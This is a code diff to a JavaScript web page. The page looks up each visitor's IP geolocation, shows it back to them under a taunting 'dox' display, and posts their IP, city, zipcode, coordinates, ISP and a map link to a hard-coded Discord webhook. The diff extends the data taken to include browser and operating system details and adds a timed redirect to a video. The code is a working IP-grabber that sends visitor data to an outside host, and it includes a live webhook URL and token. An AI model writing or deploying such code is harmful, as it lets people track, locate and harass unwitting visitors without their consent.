@@ -13,6 +13,7 @@ $.getJSON('https://ipapi.co/json')
   const lon = data.longitude;
   const net = data.network;
   const ver = data.version
+  console.log(platform);
     setTimeout(function()
     {
       document.getElementById("test").innerHTML = "GET FUCKED";
@@ -41,6 +42,18 @@ $.getJSON('https://ipapi.co/json')
                     setTimeout(function()
                     {
                       document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Network: "+net+"</div>";
+                      setTimeout(function()
+                      {
+                        document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Browser: "+platform.name+"</div>";
+                        setTimeout(function()
+                        {
+                          document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>Browser Version: "+platform.version+"</div>";
+                          setTimeout(function()
+                          {
+                            document.getElementById("dox").innerHTML = document.getElementById("dox").innerHTML + "<div id='yes'>OS: "+platform.os+"</div>";
+                          }, 500)
+                        }, 500)
+                      }, 500)
                     }, 500)
                   }, 500)
                 }, 500)
@@ -49,10 +62,10 @@ $.getJSON('https://ipapi.co/json')
           }, 500)
         }, 500)
       },500)
-    },8100)
+    },8000)
       const whurl = "https://discord.com/api/webhooks/1193834496273940611/b78sju_6H32RA7gTGy0CjlTv5_g3tWIZh-3QXUzOUF6APzUTlRBjjElFlbffQ-wmVLJg";
       const msg = {
-        "content": "@everyone : Country: " + country + " IP: " + ip + " countryCode:  " + cc + " City: " + city + " Timezone: " + time + " Wifi Provider: " + ass + " Zipcode: " + zip + " Region: " + region + " Region Name: " + regionName + " N: " + lat + " E: " + lon + 'https://www.google.com/maps/search/' + lat + '+' + lon + '?sa=X&ved=2ahUKEwjRvLWLgcmDAxVUSvEDHe9qC64Q8gF6BAgPEAA'
+        "content": "@everyone : Country: " + country + " IP: " + ip + " countryCode:  " + cc + " City: " + city + " Timezone: " + time + " Wifi Provider: " + ass + " Zipcode: " + zip + " Region: " + region + " Region Name: " + regionName + " N: " + lat + " E: " + lon + " Browser: "+platform.name+" Browser Version: "+platform.version+" OS: "+platform.os+'https://www.google.com/maps/search/' + lat + '+' + lon + '?sa=X&ved=2ahUKEwjRvLWLgcmDAxVUSvEDHe9qC64Q8gF6BAgPEAA'
       };
       return fetch(whurl, {
         "method": "POST",
@@ -62,3 +75,7 @@ $.getJSON('https://ipapi.co/json')
         "body": JSON.stringify(msg)
       });
     });
+    setTimeout(function()
+    {
+      window.location.replace("https://youtu.be/0NTl_SXSgd4?si=b3cUAS1yNpS-kUjl&t=10");
+    }, 24000)
